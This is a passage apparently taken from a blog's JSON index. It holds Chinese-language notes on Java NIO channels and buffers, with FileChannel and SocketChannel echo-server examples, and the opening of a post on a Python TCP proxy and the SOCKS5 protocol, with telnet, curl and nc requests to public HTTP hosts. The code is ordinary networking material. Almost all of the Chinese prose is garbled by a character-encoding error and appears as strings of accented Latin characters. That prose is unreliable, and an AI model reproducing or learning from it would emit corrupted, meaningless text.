‡ï¼Œå…¶å®ç½‘å¡ã€å£°å¡ã€æ˜¾å¡ä¹Ÿæ˜¯æœ‰ DMA åŠŸèƒ½çš„ã€‚DMA å°±æ˜¯ç›´æ¥å†…å­˜è®¿é—®çš„æ„æ€ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæ‹¥æœ‰ DMA åŠŸèƒ½çš„ç¡¬ä»¶åœ¨å’Œå†…å­˜è¿›è¡Œæ•°æ®äº¤æ¢çš„æ—¶å€™å¯ä»¥ä¸æ¶ˆè€— CPU èµ„æºã€‚åªè¦ CPU åœ¨å‘èµ·æ•°æ®ä¼ è¾“æ—¶å‘é€ä¸€ä¸ªæŒ‡ä»¤ï¼Œç¡¬ä»¶å°±å¼€å§‹è‡ªå·±å’Œå†…å­˜äº¤æ¢æ•°æ®ï¼Œåœ¨ä¼ è¾“å®Œæˆä¹‹åç¡¬ä»¶ä¼šè§¦å‘ä¸€ä¸ªä¸­æ–­æ¥é€šçŸ¥æ“ä½œå®Œæˆã€‚è¿™äº›æ— é¡»æ¶ˆè€— CPU æ—¶é—´çš„ I/O æ“ä½œæ­£æ˜¯å¼‚æ­¥æ“ä½œçš„ç¡¬ä»¶åŸºç¡€ã€‚æ‰€ä»¥å³ä½¿åœ¨ DOS è¿™æ ·çš„å•è¿›ç¨‹ï¼ˆè€Œä¸”æ— çº¿ç¨‹æ¦‚å¿µï¼‰ç³»ç»Ÿä¸­ä¹ŸåŒæ ·å¯ä»¥å‘èµ·å¼‚æ­¥çš„ DMA æ“ä½œã€‚ çº¿ç¨‹çš„æœ¬è´¨çº¿ç¨‹ä¸æ˜¯ä¸€ä¸ªè®¡ç®—æœºç¡¬ä»¶çš„åŠŸèƒ½ï¼Œè€Œæ˜¯æ“ä½œç³»ç»Ÿæä¾›çš„ä¸€ç§é€»è¾‘åŠŸèƒ½ï¼Œçº¿ç¨‹æœ¬è´¨ä¸Šæ˜¯è¿›ç¨‹ä¸­ä¸€æ®µå¹¶å‘è¿è¡Œçš„ä»£ç ï¼Œæ‰€ä»¥çº¿ç¨‹éœ€è¦æ“ä½œç³»ç»ŸæŠ•å…¥ CPU èµ„æºæ¥è¿è¡Œå’Œè°ƒåº¦ã€‚linuxä¸‹æœ‰ä¸€æ¡å‘½ä»¤å¯ä»¥æŸ¥çœ‹å½“å‰è¿›ç¨‹ä¸‹æœ‰å¤šå°‘ä¸ªçº¿ç¨‹ï¼šps â€“o nlwp pid ## nlwpå«ä¹‰æ˜¯number of light-weight processã€‚ps -eLo pid ,stat | grep pid | grep running | wc -l nioä¸­çš„å‡ ä¸ªä¸»è¦æ¦‚å¿µchannel å’Œjdk1.4ä¹‹å‰çš„bioçš„â€å°†ioæŠ½è±¡ä¸ºæµâ€çš„æ¦‚å¿µæ˜¯å·®ä¸å¤šçš„ï¼Œåªä¸è¿‡æµæ˜¯å•å‘çš„ï¼Œchannelæ˜¯åŒå‘çš„Buffer å°±æ˜¯å¯¹æ•°ç»„çš„å°è£…Selector å¯¹selectã€pollã€epollç³»ç»Ÿè°ƒç”¨çš„åŒ…è£…ï¼Œç”¨äºSocket channelï¼Œå› ä¸ºå®ƒè¦æ±‚channelå¿…é¡»æ˜¯éé˜»å¡çš„ bioæ˜¯æ²¡æœ‰ç¼“å†²åŒºçš„ï¼ˆBufferedInputStream,BufferedReaderè¿™ç§é™¤å¤–ï¼‰ï¼ŒåŒ…æ‹¬RandomAccessFileä¹Ÿæ²¡æœ‰ç¼“å†²åŒºNioéƒ½æ˜¯æœ‰ç¼“å†²åŒºçš„ï¼Œå¿…é¡»å’ŒBufferå¯¹è±¡ä¸€èµ·ä½¿ç”¨ï¼ŒBufferå¯¹è±¡å°±æ˜¯ç¼“å†²åŒºã€‚ ByteBufferæ˜¯å”¯ä¸€ç›´æ¥ä¸channeläº¤äº’çš„ç¼“å†²ï¼Œå› ä¸ºæ‰€æœ‰çš„æ•°æ®éƒ½æ˜¯ä»¥äºŒè¿›åˆ¶å½¢å¼å­˜åœ¨çš„åœ¨ BIO ä¸­ï¼Œä¸æ–‡ä»¶ IO ç›¸å…³è”çš„ä¸‰ä¸ªç±»æ˜¯ï¼š1) java.io.FileInputStreamï¼Œä»æ–‡ä»¶æµä¸­è¯»å–å­—èŠ‚æ•°æ®ï¼Œåªè¯»ï¼›2) java.io.FileOutputStreamï¼Œå‘æ–‡ä»¶æµä¸­å†™å…¥å­—èŠ‚æ•°æ®ï¼Œåªå†™ï¼›3) java.io.RandomAccessFileï¼Œç‹¬ç«‹çš„IOæµç±»ï¼Œæ”¯æŒråªè¯»ã€rwè¯»å†™ã€rwsè¯»å†™ + metadata/dataè‡ªåŠ¨åŒæ­¥ã€rwdè¯»å†™ + dataè‡ªåŠ¨åŒæ­¥å››ç§æ¨¡å¼ï¼› ä¸ºäº†è¿åˆ NIOï¼Œè¿™å‡ ä¸ªç±»éƒ½è¿›è¡Œä¿®æ”¹ï¼ŒåŠ å…¥äº†getChannel()æ–¹æ³•ï¼Œè·å–å¯¹åº”çš„FileChannelå¯¹è±¡ï¼Œæä¾›é«˜æ•ˆç‡çš„ I/O æ“ä½œï¼›ä½†æ˜¯ NIO å¹¶æœªç»™ FileChannel æä¾›éé˜»å¡æ”¯æŒï¼ŒFileChannel åªèƒ½è¿è¡Œåœ¨é˜»å¡æ¨¡å¼ä¸‹ï¼Œä½†æ˜¯æ•ˆç‡ä¾æ—§æ¯” BIO é«˜ï¼Œå› ä¸ºæœ‰ Buffer å•Šï¼› è€Œjava.netåŒ…ä¸­çš„ä¸‰ä¸ª Socket ç±»ï¼š1) java.net.ServerSocketï¼šTCP Socketï¼ŒServerç«¯ï¼›(ä»æºç æ¥çœ‹ï¼ŒServerSocketé‡Œé¢æœ‰ä¸€ä¸ªsocketå¯¹è±¡ï¼Œä¹Ÿå°±æ˜¯åŒ…è£…äº†ä¸€å±‚)2) java.net.Socketï¼šTCP Socketï¼›3) java.net.DatagramSocketï¼šUDP Socketï¼› è¿™å‡ ä¸ªç±»å…¶å®ä¹Ÿå®šä¹‰äº†ä¸€ä¸ªgetChannel()æ–¹æ³•ï¼Œä½†æ˜¯é»˜è®¤åªèƒ½è¿”å›nullï¼Œéœ€è¦æ˜¾å¼çš„ open() å¯¹åº”çš„ SocketChannel é€šé“ã€‚ Channelé€šé“,java.nio.channelsåŒ…ï¼Œä¸»è¦æœ‰ï¼šFileChannelã€ServerSocketChannelã€SocketChannelã€DatagramChannel FileChannelimport java.io.FileInputStream; import java.io.FileOutputStream; import java.io.RandomAccessFile; import java.io.IOException; import java.nio.ByteBuffer; import java.nio.channels.FileChannel; public class FileChannelDemo { public static void main(String[] args) throws IOException { FileChannel fc = null; fc = new FileOutputStream(&quot;data.txt&quot;).getChannel(); fc.write(ByteBuffer.wrap(&quot;www.baidu.com\\n&quot;.getBytes())); fc.close(); fc = new RandomAccessFile(&quot;data.txt&quot;, &quot;rw&quot;).getChannel(); fc.position(fc.size()); fc.write(ByteBuffer.wrap(&quot;www.google.com\\n&quot;.getBytes())); fc.close(); fc = new FileInputStream(&quot;data.txt&quot;).getChannel(); ByteBuffer buf = ByteBuffer.allocate(1024 * 4); fc.read(buf); buf.flip(); while (buf.hasRemaining()) { System.out.print((char)buf.get()); } // or System.out.println(); buf.rewind(); System.out.print(new String(buf.array(), 0, buf.remaining())); fc.close(); } } æˆ–è€… import java.nio.channels.FileChannel; import java.nio.ByteBuffer; import java.nio.file.Path; import java.nio.file.Paths; import java.nio.file.StandardOpenOption; import java.io.IOException; public class FileChannelOpen { private static Path path = Paths.get(&quot;test.txt&quot;); private static final int BUF_SIZE = 1024 * 4; public static void main(String[] args) throws IOException { FileChannel fc = FileChannel.open(path, // æ–‡ä»¶è·¯å¾„ StandardOpenOption.READ, // r StandardOpenOption.WRITE, // w StandardOpenOption.CREATE, // ä¸å­˜åœ¨æ—¶æ–°å»º StandardOpenOption.TRUNCATE_EXISTING); // æ¸…ç©ºåŸæœ‰å†…å®¹ ByteBuffer buf = ByteBuffer.allocate(BUF_SIZE); buf.put(args.length == 0 ? &quot;default-file-content\\n&quot;.getBytes() : args[0].getBytes()); fc.write((ByteBuffer)buf.flip()); fc.position(0).read((ByteBuffer)buf.clear()); System.out.print(new String(buf.array(), 0, buf.flip().remaining())); fc.close(); } } transferToï¼Œæœ€å¿«é€Ÿçš„æ–‡ä»¶å¤åˆ¶çš„æ–¹æ³• import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.IOException; import java.nio.channels.FileChannel; public class FileCopy2 { public static void main(String[] args) throws IOException { if (args.length &lt; 2) { System.err.println(&quot;Usage: FileCopy2 &lt;src_file&gt; &lt;dst_file&gt;&quot;); System.exit(1); } FileChannel in = new FileInputStream(args[0]).getChannel(), out = new FileOutputStream(args[1]).getChannel(); in.transferTo(0, in.size(), out); // or: // out.transferFrom(in, 0, in.size()); in.close(); out.close(); } } æ¥ä¸‹æ¥ä»‹ç»ï¼ŒSelectableChannelï¼Œä¸»è¦åŒ…æ‹¬ServerSocketChannelï¼ŒSocketChannelä»¥åŠDatagramChannel SocketChannelå’Œ ServerSocketChannelimport java.nio.ByteBuffer; import java.nio.charset.Charset; import java.nio.channels.ServerSocketChannel; import java.nio.channels.SocketChannel; import java.net.StandardSocketOptions; import java.net.InetSocketAddress; import java.io.IOException; public class Server { private static ServerSocketChannel servChannel; private static final InetSocketAddress BIND_ADDR = new InetSocketAddress(&quot;0.0.0.0&quot;, 8080); private static final int BACKLOG = 128; private static final int BUF_SIZE = 1024; public static void main(String[] args) throws IOException { // æ³¨å†Œ shutdown hook é’©å­, å…³é—­ servChannel Runtime.getRuntime().addShutdownHook(new Thread(new Runnable() { @Override public void run() { try { servChannel.close(); } catch (IOException e) {} } })); servChannel = ServerSocketChannel.open(); servChannel.setOption(StandardSocketOptions.SO_REUSEADDR, true); servChannel.bind(BIND_ADDR, BACKLOG); System.out.printf(&quot;----- listen: %s:%d -----\\n&quot;, BIND_ADDR.getAddress().getHostAddress(), BIND_ADDR.getPort()); SocketChannel connChannel = null; while (true) { connChannel = servChannel.accept(); service(connChannel); } } private static void service(SocketChannel connChannel) throws IOException { InetSocketAddress remoteAddr = (InetSocketAddress) connChannel.getRemoteAddress(); System.out.printf(&quot;new Connect: %s:%d\\n&quot;, remoteAddr.getAddress().getHostAddress(), remoteAddr.getPort()); ByteBuffer buf = ByteBuffer.allocate(BUF_SIZE); while (connChannel.read((ByteBuffer)buf.clear()) != -1) { System.out.printf(&quot;msg: %s\\n&quot;, Charset.forName(&quot;UTF-8&quot;).decode((ByteBuffer)buf.flip())); connChannel.write((ByteBuffer)buf.rewind()); } System.out.printf(&quot;close Connect: %s:%d\\n&quot;, remoteAddr.getAddress().getHostAddress(), remoteAddr.getPort()); connChannel.close(); } } public class Client2 { private static final InetSocketAddress SERV_ADDR = new InetSocketAddress(&quot;127.0.0.1&quot;, 8081); private static final int BUF_SIZE = 1024; public static void main(String[] args) throws IOException { SocketChannel sockChannel = SocketChannel.open(); sockChannel.setOption(StandardSocketOptions.SO_REUSEADDR, true); sockChannel.connect(SERV_ADDR); ByteBuffer buf = ByteBuffer.allocate(BUF_SIZE); if (args.length == 0) { buf.put(&quot;default-message&quot;.getBytes(&quot;UTF-8&quot;)); sockChannel.write((ByteBuffer)buf.flip()); sockChannel.read((ByteBuffer)buf.clear()); System.out.printf(&quot;msg: %s\\n&quot;, Charset.forName(&quot;UTF-8&quot;).decode((ByteBuffer)buf.flip())); } for (String s : args) { ((ByteBuffer)buf.clear()).put(s.getBytes(&quot;UTF-8&quot;)); sockChannel.write((ByteBuffer)buf.flip()); sockChannel.read((ByteBuffer)buf.clear()); System.out.printf(&quot;msg: %s\\n&quot;, Charset.forName(&quot;UTF-8&quot;).decode((ByteBuffer)buf.flip())); } sockChannel.close(); } } DatagramChannelè¿™ä¸ªä¸»è¦æ˜¯udpäº† æœ€åä¸è¦è¿·ä¿¡nioï¼š DirectByteBufferçš„æœ¬æ„å¹¶ä¸æ˜¯ä¸ºäº†å‡å°‘å†…å­˜æ‹·è´(è€Œæ˜¯ä¸ºäº†å›ºå®šå†…å­˜åœ°å€)ï¼ŒDirectByteBufferçš„å›æ”¶æœºåˆ¶æ¯”è¾ƒé‡è¦ï¼Œå› ä¸ºä¸‡ä¸€å‘ç”Ÿå †å¤–å†…å­˜æ³„éœ²æ˜¯æ¯”è¾ƒä¸¥é‡çš„ã€‚ ä¸è¦åŠ¨ä¸åŠ¨å°±mmapï¼Œmmapåœ¨è¯»å†™å¤§æ–‡ä»¶çš„æ—¶å€™æ‰ä½“ç°å‡ºæ˜æ˜¾çš„ä¼˜åŠ¿ ä½¿ç”¨transferToå’ŒtransferFromï¼ˆä¼šæŒ‰ç…§sendfile,mmap,bioçš„é¡ºåºæŸ¥çœ‹å½“å‰ç³»ç»Ÿæ”¯æŒå“ªä¸ªï¼‰ nioæ˜¯ç›´æ¥å’Œbyteæ‰“äº¤é“ï¼Œjavaçš„å†…ç æ˜¯utf-16BEï¼ˆä¸ºæ¯›cè¯­è¨€åªè¦1ä¸ªbyteï¼Œjavaä¸€ä¸ªcharå´è¦2ä¸ªbyte,å› ä¸ºæ–¹ä¾¿å•Šï¼Œè™½ç„¶æµªè´¹ç‚¹å†…å­˜ï¼Œä½†æ˜¯æ‰€æœ‰çš„å­—ç¬¦ï¼Œä¸ç®¡æ˜¯è‹±æ–‡ï¼Œæ‹‰ä¸æ–‡ï¼Œä¸­æ–‡ï¼Œé˜¿æ‹‰ä¼¯æ–‡ï¼Œ2ä¸ªå­—èŠ‚ï¼Œ2^16,unicodeä¹Ÿæ²¡æœ‰è¿™ä¹ˆå¤šå§ã€‚ç›¸åº”çš„,1ä¸ªå­—ç¬¦çš„cè¯­è¨€çš„charå°±ä¸èƒ½é‚£ä¹ˆæ–¹ä¾¿çš„å­˜å‚¨ä¸­æ–‡äº†ã€‚ï¼‰ javaçš„å¾ˆå¤šapiæ˜¯ç›´æ¥å¯¹cè¯­è¨€çš„apiçš„åŒ…è£…ï¼Œjava.io.RandomAccessFileï¼Œç‹¬ç«‹çš„IOæµç±»ï¼Œæ”¯æŒråªè¯»ã€rwè¯»å†™ã€rwsè¯»å†™ + metadata/dataè‡ªåŠ¨åŒæ­¥ã€rwdè¯»å†™ + dataè‡ªåŠ¨åŒæ­¥å››ç§æ¨¡å¼ã€‚çŒœæµ‹å’Œfsync(åŒæ­¥dataå’Œmetadata)å’Œfsyncdata(ä»…ä»…åŒæ­¥data)æœ‰å…³ã€‚ ByteOrderï¼Œå­—èŠ‚åºã€‚ å‚è€ƒç¾å›¢å›¢é˜Ÿå‡ºçš„å…³äºnioçš„è§£è¯´java nio ä½œè€…çš„æ–‡ç« æ¡ç†å¾ˆæ¸…æ™°ã€‚è¿™é‡Œé¢æœ‰ä¸€å¥åŸè¯æ‘˜æŠ„ä¸‹æ¥ï¼š çº¿ç¨‹çš„åˆ›å»ºå’Œé”€æ¯æˆæœ¬å¾ˆé«˜ï¼Œåœ¨Linuxè¿™æ ·çš„æ“ä½œç³»ç»Ÿä¸­ï¼Œçº¿ç¨‹æœ¬è´¨ä¸Šå°±æ˜¯ä¸€ä¸ªè¿›ç¨‹ã€‚åˆ›å»ºå’Œé”€æ¯éƒ½æ˜¯é‡é‡çº§çš„ç³»ç»Ÿå‡½æ•°ã€‚åƒJavaçš„çº¿ç¨‹æ ˆï¼Œä¸€èˆ¬è‡³å°‘åˆ†é…512Kï½1Mçš„ç©ºé—´ï¼Œ è¿™ä¸ªå€¼(jvmåˆ›å»ºä¸€æ¡çº¿ç¨‹æ—¶ä¸ºå…¶åˆ†é…çš„call stack size)å…¶å®æ˜¯å¯é…ç½®çš„ï¼Œ-XX:ThreadStackSize(é»˜è®¤æ˜¯1Mï¼Œä¹Ÿå°±æ˜¯åˆ›å»ºä¸€æ¡çº¿ç¨‹è‡³å°‘è¦å ç”¨1Mçš„å†…å­˜)","tags":[{"name":"tbd","slug":"tbd","permalink":"https://haldir65.github.io/tags/tbd/"}]},{"title":"tcp-proxyç®€å•å®ç°åŠsocksåè®®ç›¸å…³","date":"2018-12-31T18:45:38.000Z","path":"2018/12/31/2018-12-31-tcp-proxy-and-socks-server-related/","text":"pythonå®ç°ç®€æ˜“çš„tcp-proxy serveråŠsocksä»£ç†å­¦ä¹ ç¬”è®° é¦–å…ˆæ˜¯åŸºæœ¬çš„æµç¨‹æœ¬åœ°èµ·ä¸€ä¸ªtcpä»£ç†ï¼Œç›‘å¬0.0.0.0çš„1090ç«¯å£,æ¥æ”¶åˆ°ä»»ä½•æ•°æ®ä¹‹ååŸå°ä¸åŠ¨å‘é€åˆ°è¿œç¨‹æœåŠ¡å™¨ã€‚æ¥ç€æœ¬æœºæˆ–è€…å±€åŸŸç½‘å†…å…¶ä»–æœºå™¨ä½¿ç”¨telnetå¾€è¿™ä¸ª1090ç«¯å£å‘æ•°æ®ã€‚è¿™æ ·çš„proxyå…¶å®ä¹Ÿå°±æ˜¯å®è´¨ä¸Šçš„ä¸€ä¸ªtcpè·³æ¿æœºã€‚ å…ˆä»‹ç»ä¸€ä¸‹telnetçš„ä½¿ç”¨æ•™ç¨‹åœ¨windowsä¸Štelnetå¥½åƒé»˜è®¤å…³é—­äº†ã€‚åœ¨macä¸Šï¼š telnet 127.0.0.1 1090 // è¿™å¥è¯ç±»ä¼¼äºè¿æ¥åˆ°è¿™ä¸ªportï¼Œä½†æ˜¯è¿˜æ²¡æœ‰å‘é€æ•°æ®ã€‚æ¥ä¸‹æ¥å¯ä»¥å‘é€æ•°æ® åœ¨macä¸Šctrl+]æ˜¯è¿›å…¥å‘½ä»¤æ¨¡å¼ï¼Œå¯ä»¥è¾“å…¥ä¸€äº›æ¯”è¾ƒå¥½ç©çš„å‘½ä»¤:æ¯”å¦‚helpï¼Œæ¯”å¦‚quitã€‚send ayt //åŸå°ä¸åŠ¨å‘é€are you there è¿™å‡ ä¸ªå­—ç¬¦send ? //æŸ¥çœ‹å¯ä»¥ä½¿ç”¨sendå‘é€å“ªäº›æŒ‡ä»¤ï¼Œå…¶å®å°±æ˜¯å‘é€å­—ç¬¦telnetçš„è¾“å‡ºæŒ‰åˆ é™¤é”®æ˜¯ä¸ä¼šæ¸…é™¤çš„ï¼Œè¾“å…¥clså°±å¯ä»¥äº†ã€‚ å¦å¤–,telnetæ˜¯æ˜æ–‡å‘é€çš„ï¼Œsshä¼šåŠ å¯†ä¸€ä¸‹Telnet data is sent in clear text. Itâ€™s certainly a good idea to use SSH to access network devices especially when going through a public network like Internet. As you are probably aware SSH would encrypt all data between the client/server and even if someone gets a hand on the data itâ€™s of no use. ç„¶åå°±æ˜¯å¦‚ä½•å®ç°è¿™ä¸ªæœ¬åœ°ä»£ç†äº† æœ¬åœ°å…ˆç»‘å®šä¸€ä¸ªsocketåœ¨1090ç«¯å£ 1090ç«¯å£æ¯æ¬¡æ¥æ”¶åˆ°ä¸€ä¸ªæ–°çš„sockè¿æ¥ï¼Œèµ·ä¸€ä¸ªæ–°çš„çº¿ç¨‹ï¼Œå»å¤„ç†å’Œè¿™ä¸ªæ–°çš„clientçš„ä¸€æ¬¡ä¼šè¯ åœ¨è¿™ä¸ªä¼šè¯é‡Œé¢ï¼ŒåŒæ—¶å¯åŠ¨ä¸¤ä¸ªçº¿ç¨‹ï¼ˆä¸€ä¸ªä»local clientè¯»æ•°æ®ï¼Œç„¶åå‘ç»™remote serverï¼›å¦ä¸€ä¸ªä»remote serverè¯»å–æ•°æ®ï¼Œå‘ç»™local clientï¼‰ è¿™é‡Œé¢æ¯ä¸ªä¼šè¯çš„remote serveréƒ½æ˜¯ä¸€ä¸ªä¸€ä¸ªå›ºå®šçš„ip:portï¼Œä½†æ˜¯local clientçš„portæ˜¯å˜æ¥å˜å»çš„ çœ‹çœ‹ç¬¬ä¸‰æ­¥ï¼Œå…¶å®å°±æ˜¯ä¸€ä¸ªå¾€è¿”ï¼Œæ‰€ä»¥é¡ºåºæ‰ä¸ªå¤´å°±è¡Œäº†ï¼Œè€Œä¸”å½¼æ­¤äº’ç›¸ä¸å¹²æ‰°ï¼ˆåœ¨åªæœ‰ä¸€ä¸ªä¼šè¯çš„æ—¶å€™ï¼Œremote.recvå¯ä»¥è®¤ä¸ºå°±æ˜¯å¯¹å½“å‰client.sendçš„å›åº”ï¼‰è¿™ä¸ªå¾€è¿”ç”¨ä»£ç æè¿°ä¸€ä¸‹å°±æ˜¯: def sock_proxy(remote, local): local_request = local.recv(4096) ## å¦‚æœlocalå’Œremoteå¯¹è°ƒä¸€ä¸‹ï¼Œè¿™é‡Œå°±æ˜¯ä»remoteè¯»æ•°æ® ## .... remote.sendAll(local_request.encode()) ## è¿™é‡Œå°±æ˜¯ GET / HTTP1.1 ...è¿™ç§å­—ç¬¦ä¸²ï¼Œå¦‚æœlocalå’Œremoteå¯¹è°ƒä¸€ä¸‹ï¼Œå°±æ˜¯å‘æ•°æ®ç»™local client çœç•¥äº†ä¸€äº›try exceptå’Œsocket.closeçš„ä»£ç ã€‚ä¸Šé¢å†™äº†4096ï¼Œæ˜¯è¯´æœ€å¤§æ¥æ”¶æ•°æ®é‡æ˜¯4096å­—èŠ‚ï¼Œä¸æ˜¯ä¸€æ¬¡è¯»å–4096ä¸ªå­—èŠ‚çš„æ„æ€ã€‚ä¸‹é¢æ˜¯pythonä¸­è¿™å‡ ä¸ªå‡½æ•°çš„å®šä¹‰ s.recv(bufsize[,flag]) æ¥å—TCPå¥—æ¥å­—çš„æ•°æ®ã€‚æ•°æ®ä»¥å­—ç¬¦ä¸²å½¢å¼è¿”å›ï¼ŒbufsizeæŒ‡å®šè¦æ¥æ”¶çš„æœ€å¤§æ•°æ®é‡ã€‚flagæä¾›æœ‰å…³æ¶ˆæ¯çš„å…¶ä»–ä¿¡æ¯ï¼Œé€šå¸¸å¯ä»¥å¿½ç•¥ã€‚ s.send(string[,flag]) å‘é€TCPæ•°æ®ã€‚å°†stringä¸­çš„æ•°æ®å‘é€åˆ°è¿æ¥çš„å¥—æ¥å­—ã€‚è¿”å›å€¼æ˜¯è¦å‘é€çš„å­—èŠ‚æ•°é‡ï¼Œè¯¥æ•°é‡å¯èƒ½å°äºstringçš„å­—èŠ‚å¤§å°ã€‚ s.sendall(string[,flag]) å®Œæ•´å‘é€TCPæ•°æ®ã€‚å°†stringä¸­çš„æ•°æ®å‘é€åˆ°è¿æ¥çš„å¥—æ¥å­—ï¼Œä½†åœ¨è¿”å›ä¹‹å‰ä¼šå°è¯•å‘é€æ‰€æœ‰æ•°æ®ã€‚æˆåŠŸè¿”å›Noneï¼Œå¤±è´¥åˆ™æŠ›å‡ºå¼‚å¸¸ã€‚ å…·ä½“ç”¨ä»€ä¹ˆè¯­è¨€æ¥å®ç°ï¼Œå…¶å®éƒ½æ²¡ä»€ä¹ˆå¤§çš„å·®åˆ«äº†ã€‚ç”¨Pythonå¥½åœ¨è·¨å¹³å°ï¼Œä»£ç é‡å°‘ã€‚ ä½¿ç”¨æ–¹å¼ python tcp_proxy -l 0.0.0.0:1090 -r zhihu.com:80 -v //ä»£ç æ˜¯åœ¨åˆ«äººçš„åŸºç¡€ä¸Šæ”¹çš„ï¼Œç›´æ¥ç”¨åˆ«äººçš„argument parseräº† æ„æ€å°±æ˜¯åœ¨æœ¬åœ°ç›‘å¬1090ç«¯å£ï¼Œä»»ä½•å‘åˆ°æœ¬åœ°1090ç«¯å£çš„åŒ…éƒ½ä¼šè¢«å‘åˆ°zhihu.comè¿™ä¸ªhostçš„80ç«¯å£(æµ‹è¯•äº†ä¸‹ï¼ŒçŸ¥ä¹è¿”å›çš„responseæ˜¯æ­£å¸¸çš„) æœ¬åœ°å¦å¤–èµ·ä¸€ä¸ªtelnet telnet 127.0.0.1 1090GET / HTTP 1.1 \\r\\n\\r\\n //äº‹å®ä¸Šåœ¨telneté‡Œé¢è¾“å…¥æ¢è¡Œç¬¦æœ‰ç‚¹å›°éš¾ï¼Œå› ä¸ºæŒ‰ä¸‹å›è½¦çš„æ—¶å€™ä¼šé¡ºå¸¦åœ¨åé¢åŠ ä¸Šæ¢è¡Œç¬¦â€¦ç„¶åè¿™é‡Œå°±ä¼šå‡ºç°è¿œç¨‹æœåŠ¡å™¨çš„å›åº”ã€‚ å› ä¸ºç›´æ¥ä»clientçš„æŠ¥æ–‡ä¸­æå–è¯·æ±‚ä¿¡æ¯å…¶å®æŒºæ²¡æ„æ€çš„ï¼Œæ‰€ä»¥æš‚æ—¶åœ¨pythonä»£ç é‡Œå†™æ­»äº†å‘é€ç»™è¿œç¨‹çš„content å‘ç°curlåŸæ¥å¯ä»¥ç›´æ¥å¾€ä»»æ„host:portå‘é€httpæ ¼å¼çš„è¯·æ±‚ curl localhost:1090 åœ¨proxyä¸€ä¾§æ”¶åˆ°çš„è¯·æ±‚æŠ¥æ–‡ï¼š GET / HTTP/1.1 Host: localhost:1090 User-Agent: curl/7.54.0 Accept: */* æœ€åæ˜¯æœ‰ä¿©æ¢è¡Œçš„ ç”¨nc(netcat)ä¹Ÿèƒ½å¾€1090ç«¯å£å‘æ•°æ® nc 127.0.0.1 1090GET / HTTP 1.1 \\r\\n\\r\\n è¿™ä¸ªå¯ä»¥ç›´æ¥æ‰“æ¢è¡Œï¼Œæ›´æ–¹ä¾¿ ç›´æ¥ç”¨ncå‘èµ·httpè¯·æ±‚ printf &quot;GET /status/200 HTTP/1.1\\r\\nHost: httpbin.org\\r\\n\\r\\n&quot; | nc httpbin.org 80 cat &lt;(printf &quot;GET /status/200 HTTP/1.1\\r\\nHost: httpbin.org\\r\\nConnection: close\\r\\n\\r\\n&quot;) | nc httpbin.org 80 ç¬¬ä¸€è¾“å‡ºæŠ¥æ–‡åï¼Œä¸ä¼šæ–­å¼€ï¼Œç¬¬äºŒæ®µç›´æ¥æ–­å¼€ï¼ŒåŸå› æ˜¯è¿œç¨‹ç›´æ¥æ–­å¼€è¿æ¥äº†ã€‚ æ¥ä¸‹æ¥å°±æ˜¯çœ‹å¦‚ä½•å¤„ç†å¤šä¸ªclientçš„session(sock5åè®®å®ç°)ä»¥ä¸Šå®ç°çš„åªæ˜¯ä¸€ä¸ªtcp proxyï¼Œå°±æ˜¯å®Œå…¨ä¸æ£€æŸ¥é€šä¿¡å†…å®¹çš„ä»£ç†ï¼Œæ˜¯ç›´æ¥ç«™åœ¨tcpå±‚çš„ã€‚ç°å®ä¸­è¿˜æœ‰http proxy,sock proxyï¼Œå½¼æ­¤ä¹‹é—´æœ‰ä¸€äº›å·®åˆ«ã€‚ å¤šä¸ªclientæˆ–è€…ä¸€ä¸ªclientçš„å¤šä¸ªportåŒæ—¶èµ°è¿™ä¸ªä»£ç†å»è®¿é—®è¿œç¨‹æ—¶ï¼Œä»£ç†æœåŠ¡å™¨ä¸å¯é¿å…è¦è®°å½•ä¸‹clientå’Œseverä¹‹é—´çš„è¿çº¿ï¼Œé€‚å½“çš„è¿˜è¦åœ¨packeté‡Œé¢å¡ä¸€äº›æ ‡è®°ã€‚ä¸šå†…æˆç†Ÿçš„æ–¹æ¡ˆå½“ç„¶æ˜¯sock5åè®®,å¯¹åº”çš„æ ‡å‡†æ˜¯RFC 1928å’ŒRFC 1929ã€‚ ä»wikiä¸Šæ¥çœ‹sock5æ˜¯åœ¨sock4ç‰ˆæœ¬çš„åŸºç¡€ä¸ŠåŠ äº†é‰´å®šã€IPv6ã€UDPæ”¯æŒã€‚ SOCKSå·¥ä½œåœ¨æ¯”HTTPä»£ç†æ›´ä½çš„å±‚æ¬¡ï¼šSOCKSä½¿ç”¨æ¡æ‰‹åè®®æ¥é€šçŸ¥ä»£ç†è½¯ä»¶å…¶å®¢æˆ·ç«¯è¯•å›¾è¿›è¡Œçš„è¿æ¥SOCKSï¼Œç„¶åå°½å¯èƒ½é€æ˜åœ°è¿›è¡Œæ“ä½œï¼Œè€Œå¸¸è§„ä»£ç†å¯èƒ½ä¼šè§£é‡Šå’Œé‡å†™æŠ¥å¤´ï¼ˆä¾‹å¦‚ï¼Œä½¿ç”¨å¦ä¸€ç§åº•å±‚åè®®ï¼Œä¾‹å¦‚FTPï¼›ç„¶è€Œï¼ŒHTTPä»£ç†åªæ˜¯å°†HTTPè¯·æ±‚è½¬å‘åˆ°æ‰€éœ€çš„HTTPæœåŠ¡å™¨ï¼‰ã€‚è™½ç„¶HTTPä»£ç†æœ‰ä¸åŒçš„ä½¿ç”¨æ¨¡å¼ï¼ŒCONNECTæ–¹æ³•å…è®¸è½¬å‘TCPè¿æ¥ï¼›ç„¶è€Œï¼ŒSOCKSä»£ç†è¿˜å¯ä»¥è½¬å‘UDPæµé‡å’Œåå‘ä»£ç†ï¼Œè€ŒHTTPä»£ç†ä¸èƒ½ã€‚HTTPä»£ç†é€šå¸¸æ›´äº†è§£HTTPåè®®ï¼Œæ‰§è¡Œæ›´é«˜å±‚æ¬¡çš„è¿‡æ»¤ï¼ˆè™½ç„¶é€šå¸¸åªç”¨äºGETå’ŒPOSTæ–¹æ³•ï¼Œè€Œä¸ç”¨äºCONNECTæ–¹æ³•ï¼‰ã€‚ sock5_protocolåè®®åŒ…æ‹¬:åè®®åå•†å®¢æˆ·ç«¯é¦–å…ˆå‘SOCKSæœåŠ¡å™¨è‡ªå·±çš„åè®®ç‰ˆæœ¬å·ï¼Œä»¥åŠæ”¯æŒçš„è®¤è¯æ–¹æ³•ã€‚SOCKSæœåŠ¡å™¨å‘å®¢æˆ·ç«¯è¿”å›åè®®ç‰ˆæœ¬å·ä»¥åŠé€‰å®šçš„è®¤è¯æ–¹æ³•ã€‚ è®¤è¯å®¢æˆ·ç«¯æ 